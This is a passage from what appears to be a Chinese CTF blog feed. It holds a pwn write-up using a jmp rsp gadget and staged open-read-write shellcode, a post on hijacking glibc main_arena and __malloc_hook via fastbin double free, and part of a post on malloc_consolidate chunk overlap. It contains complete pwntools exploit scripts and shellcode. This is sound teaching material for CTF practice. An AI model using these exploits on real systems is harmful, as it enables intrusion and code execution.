就可以实现手写shellcode的一次执行</p><p>jmp指令实际上就是将rip指针跳转到rsp指针指向的地址</p><p>我们的jmp rsp指令覆盖的是ret addr shellcode是在retaddr的下一个字长处 此时ret指令弹出jmp rsp到rip寄存器中 rsp指针+8</p><p>也就指向了shellcode的起始地址 从而jmp rsp将rip寄存器指向shellcode的起始地址</p><p>接着就是如何构造shellcode了  既然没有开启NX保护 又开启了沙盒 想直接获取shell显然是行不通了 </p><p>只能通过orw的办法 这里有两种实现的逻辑 一种是采用shellcode的orw 一种是构造rop链的orw</p><p>不过显然后者的利用更加麻烦 需要更多的步骤 于是这里采用前者</p><p>对于第二次shellcode要写在哪里  这里遇到了个小问题 在比赛的时候采用的是ubuntu18的机子 libc文件采用的是本地的libc</p><p>vmmap查看到的内存空间中 0x601000到0x602000这一个页是有rwx权限的  可以供我们存放第二次shellcode</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172236862.png" title="image-20230417223628826" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172236862.png" alt="image-20230417223628826"></a></p><p>不过编写这次的wp的时候采用的是ubuntu20的机子 哪怕我把libc更换成了ubuntu18同款 但是0x601000到0x602000却没有可执行权限</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172237110.png" title="image-20230417223736082" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172237110.png" alt="image-20230417223736082"></a></p><p>也是非常神奇 既然这样就采用原本做题的时候废弃的一个解法 在栈上写第二次shellcode 比赛的时候第一次的exp也是这种做法 不过最后因为远程和本地的libc差异导致偏移不同 最后也没有打通 不过本地复现重要的是掌握这题的知识点 所以倒也无所谓</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = &quot;&quot;&quot;</span><br><span class="line">xor eax,eax</span><br><span class="line">shl edx,12</span><br><span class="line">syscall</span><br><span class="line">sub rsp,0x30</span><br><span class="line">jmp rsp</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>首先设置异或清空eax寄存器 随后利用shl逻辑左移 扩大edx的值 随后syscall 调用read函数</p><p>此时read函数写入数据的地址和rsp指针指向的地址 我们来查看一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172240375.png" title="image-20230417224047323" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304172240375.png" alt="image-20230417224047323"></a></p><p>可以看到差值是0x30 如果我们在执行完read以后 把rsp指针往低地址处挪动 随后再来一句jmp rsp 就可以执行第二次shellcode 第二次shellcode也就是为了达到orw效果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    push 0x67616c66</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    xor esi,esi</span><br><span class="line">    push 2</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi,rax</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    mov edx,0x100</span><br><span class="line">    xor eax,eax</span><br><span class="line">    syscall</span><br><span class="line">    mov edi,1</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    push 1</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>剩下的就没什么好说了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input a guess num:&quot;</span>)</span><br><span class="line">buf = libc.rand()%<span class="number">50</span></span><br><span class="line">io.sendline(<span class="built_in">str</span>(buf))</span><br><span class="line">io.recvuntil(<span class="string">&quot;your door&quot;</span>)</span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">shl edx,12</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">sub rsp,0x30</span></span><br><span class="line"><span class="string">jmp rsp</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">jmp_rsp = <span class="number">0x000000000040094e</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(jmp_rsp)+asm(shellcode)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x400949&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>main_arena利用</title>
      <link href="/2023/04/11/main-arena%E5%88%A9%E7%94%A8/"/>
      <url>/2023/04/11/main-arena%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>配合fastbin的一种攻击办法 fastbin主要是受限于size域的检测不能随便任意写 main_arena的存在弥补了这一缺点 下面来详细介绍一下</p><h1 id="main-arena源码分析"><a href="#main-arena源码分析" class="headerlink" title="main_arena源码分析"></a>main_arena源码分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>glibc中的arena就是基于malloc_state这个结构体表示的 其大部分都无需我们深入了解 </p><p>有两个部分值得我们重点关注和利用</p><p>fastbinsY数组和top指针</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304121323596.png" title="image-20230412132309510" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304121323596.png" alt="image-20230412132309510"></a></p><p>可以看到 此时蓝框中的内容和fastbin链表上链表尾的chunk是一致的</p><p>同时红框代表的是top chunk的addr</p><h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><p>我们知道 限制fastbin attack任意写的根本在于size域的检测 但是利用fastbin链表头对于main_arena的影响不知道你有没有什么思路</p><p>如果我们利用double free 将原本的ptr_addr改为size 就可以达到满足size域的检测</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304121328238.png" title="image-20230412132828191" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304121328238.png" alt="image-20230412132828191"></a></p><p>此时用同样的方法 就可以获取到main_arena的chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_addr = gift()</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#6</span></span><br><span class="line">main_arena_addr = libc_addr + (<span class="number">0x7f62971c4b20</span>-<span class="number">0x7f6296e00000</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">8</span>,p64(main_arena_addr))</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#10</span></span><br></pre></td></tr></table></figure><p>为了方便调试 所以libc基址我的调试程序自带了一个函数提供</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304121333162.png" title="image-20230412133358136" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304121333162.png" alt="image-20230412133358136"></a></p><p>可以看到 此时的main_arena满足了申请一个0x20大小的chunk 于是我们的chunk10就劫持了这片区域</p><p>当然光靠这些当然攻击效果不显著 我们的目标是任意写 不知道你还记不记得正常分配一个chunk是如何进行的</p><p>chunk初始化后 如果bin中没有合适的chunk 那么就是通过分割top chunk来分配 而你还记不记得 top chunk的起始地址是存放在main_arena中的 如果我们把其覆盖为ptr_addr 就可以达到任意写的目的</p><p>并且通过上述的办法 我们已经获得了在main_arena上申请chunk的能力 只需要对上述的size进行扩大 使其能够覆盖到top chunk即可 如果题目对于chunk的大小进行了限制 仍然可以通过套娃的办法来延申可控制的范围</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_addr = gift()</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#6</span></span><br><span class="line">main_arena_addr = libc_addr + (<span class="number">0x7f62971c4b20</span>-<span class="number">0x7f6296e00000</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="number">8</span>,p64(main_arena_addr))</span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x70</span>)<span class="comment">#10</span></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(malloc_hook-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#11</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4527a</span></span><br><span class="line">edit(<span class="number">11</span>,<span class="number">8</span>,p64(onegadget_addr))</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#12</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里的chunk10就是控制main_arena上的top chunk</p><p>此时再次申请一个chunk11 获得的就是malloc_hook处的空间 但是不知道为啥0x10大小的chunk貌似不行 有待研究</p><p>随后就是触发onegadget获得shell 上述的exp属于有很多漏洞的题目  具体题目需要用到这种办法还需要自己研究</p><p>总结一下还是比较简单的一个小tip</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>malloc_consolidate利用</title>
      <link href="/2023/04/11/malloc-consolidate%E5%88%A9%E7%94%A8/"/>
      <url>/2023/04/11/malloc-consolidate%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>比较强大的一个漏洞  触发的条件很常见 但是效果却很强大 在做NKCTF2023的时候作为压轴题考察了 后来才知道是原题 heapstorm zero</p><h1 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate()"></a>malloc_consolidate()</h1><p>核心的利用就是依靠这个函数 这个函数有两种作用 第一是可以合并fastbinchunk 第二个是对于堆进行初始化</p><p>在学习fastbin中 我们知道 chunk被释放到fastbin后 其next chunk的Inuse位是不会被置零的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111239100.png" title="image-20230411123932006" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111239100.png" alt="image-20230411123932006"></a></p><p>也就不会存在合并chunk这种利用方法</p><p>但是malloc_consolidate函数却可以实现合并fastbin的效果 按照上图的情形 此时触发malloc_consolidate函数 chunk0就会被放入到unsortedbin中 随后根据大小分配到smallbin中</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111241743.png" title="image-20230411124113716" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111241743.png" alt="image-20230411124113716"></a></p><p>我们先来讲其实现逻辑 触发条件稍等讲</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  malloc_init_state(av);</span><br><span class="line">  check_malloc_state(av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数开始执行时 会对于get_max_fast ()的返回值进行判断 如果进程是第一次调用malloc函数时 其返回值为0 此时就会进行堆初始化工作</p><p>如果堆已经初始化完成 此时会调用clear_fastchunks函数清空fastbin的Inuse位</p><p>接着会进行一个嵌套循环 第一次循环遍历fastbin数组 得到链表 随后遍历链表 得到free chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">  then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">  placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">  until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">  reused anyway.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br></pre></td></tr></table></figure><p>对于合并来说 首先是考虑向后合并 这里的向后合并指的是向低地址处</p><p>顺便复习一下向后合并的条件 </p><p>其会对当前chunk的Inuse位进行判断 是否可以和物理相邻低地址处的chunk合并 接着通过prev_size位来索引prev_chunk的地址</p><p>修改其size为合并后的总和 随后让chunk进入unlink函数</p><p>常见的就是topchunk合并  图例下面一并讲</p><p>随后进入向前合并的分支 首先判断物理相邻高地址处的chunk是否为top chunk</p><p>如果为top chunk 则top chunk直接触发向后合并 如下所示布局堆</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">malloc_consolidate()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111308526.png" title="image-20230411130840500" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111308526.png" alt="image-20230411130840500"></a></p><p>如果nextchunk不为top chunk的话 则正式进入向前合并</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>首先先索引到nextchunk 再索引到nextchunk的nextchunk 根据其的Inuse位来判断是否nextchunk被释放 如果被释放 如下图所示</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111303234.png" title="image-20230411130340202" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111303234.png" alt="image-20230411130340202"></a></p><p>那么就会合并chunk0和chunk1 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111304237.png" title="image-20230411130437209" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111304237.png" alt="image-20230411130437209"></a></p><h1 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h1><p>malloc_consolidate函数的强大功能我们上面已经了解到了 利用这一函数 可以轻松的获取smallbin或者largebin中的chunk </p><p>对于有些题目来说 其会对申请chunk的size进行限制 利用这一函数就可以绕过限制 仍然获得释放chunk到这两个bin中的机会</p><p>首先我们要知道 c语言中的标准输出和标准输入和标准错误都有着缓冲区 只不过其各自遵守的缓冲区原则不同</p><p>具体的可以去看我相关博客 这里只需要知道 哪怕大部分的程序都会将缓冲区设置为无缓冲模式 但是如果scanf函数一次性读入过多的字符串 其还是会调用malloc申请一个大chunk</p><p>而很多堆题 鉴于出题人的出题习惯或者是疏忽 在菜单页时选择的选项是由scanf函数来的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111333662.png" title="image-20230411133324635" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111333662.png" alt="image-20230411133324635"></a></p><p>这也解决了我刚学堆时的疑问 为什么大部分都要用到atoi函数来中转 而不选择scanf直接读</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure><p>就以这题举例 此时利用scanf读入0x1000字节的‘1’</p><p>在此之前 没有进行任何的malloc调用 理论来说 此时heap应该还没有被初始化 但是在gdb中 我们是可以索引到top chunk的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111336586.png" title="image-20230411133618564" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111336586.png" alt="image-20230411133618564"></a></p><p>接着来查看一下top chunk的内容 可以看到都是1</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111336206.png" title="image-20230411133648176" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111336206.png" alt="image-20230411133648176"></a></p><p>也就是说其申请了一个大chunk用来存放过多的字符串 随后释放到bin中和top chunk合并了</p><p>通过这个办法 就可以调用到malloc_consolidate 不过具体的调用流程我也不清楚 尝试过源码调试 但是也不知道打断点在哪里</p><h1 id="怎样利用"><a href="#怎样利用" class="headerlink" title="怎样利用"></a>怎样利用</h1><p>可以用来利用的点 一个是刚才提到的 有些题目会对chunk的大小进行限制 从而没有办法释放chunk到unsortedbin 泄露libc基址 利用这种办法 只要是可以释放到fastbin中的chunk 都能进入unsortedbin</p><p>第二点 还需要一个特性相辅相成 不知道你有没有留意 在我们先前讲到的向前合并或者是向后合并 其是如何索引prev_chunk和next_chunk的呢 无非就是利用chunk头的那两个数值 size域就不动什么歪脑经了 修改后整个heap结构都会变化 那么目标自然是放在prev_size上了</p><p>你可能会想到利用堆溢出来覆盖prev_size 这个办法自然可行 不过我们先来观察一下利用malloc_consolidate形成的smallbin chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(<span class="number">0x18</span>)  <span class="comment">#0 - 10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">bigchunk()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111836571.png" title="image-20230411183628468" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111836571.png" alt="image-20230411183628468"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111836421.png" title="image-20230411183640387" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111836421.png" alt="image-20230411183640387"></a></p><p>可以看到 虽然其合并成了一个0x140大小的chunk 但是在其内部 实际上还保留着原本chunk各自的size 并且size的值也可以表明是向后合并</p><p>基于这种数值的残留 存在着chunk overlap 下面跟着我一步步来看如何实现</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(<span class="number">0x18</span>)  <span class="comment">#0 - 10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">bigchunk()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>此时的堆结构如图所示</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111904289.png" title="image-20230411190403256" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304111904289.png" alt="image-20230411190403256"></a></p><p>可以看到此时的smallbin已经被拆分成蓝框中的两个chunk了 我们利用chunk0溢出将chunk1的size域修改为0x100后 由于0xe4b020处残留着代表0x20大小的chunk头 所以形成了上图的情形</p><p>这样做的目的何在呢  可以看到此时最后一个chunk的prev_size为0x120 如果我们将其释放后 再利用malloc_consolidate就会索引到smallbin中的chunk 从而触发向后合并</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112236993.png" title="image-20230411223630936" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112236993.png" alt="image-20230411223630936"></a></p><p>这样做的用意在于保留堆块指针 获得chunk overlap</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x38</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#13   0xa0</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#14   0xe0</span></span><br></pre></td></tr></table></figure><p>此时我们再次申请四个0x38大小的chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112240112.png" title="image-20230411224045074" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112240112.png" alt="image-20230411224045074"></a></p><p>此时将smallbin瓜分完毕 随后我们释放前两个chunk 并且将其释放到smallbin中(其实一个也行 只要构造一个smallbin就行了 无关大小)</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112243424.png" title="image-20230411224341375" class="gallery-item"><img 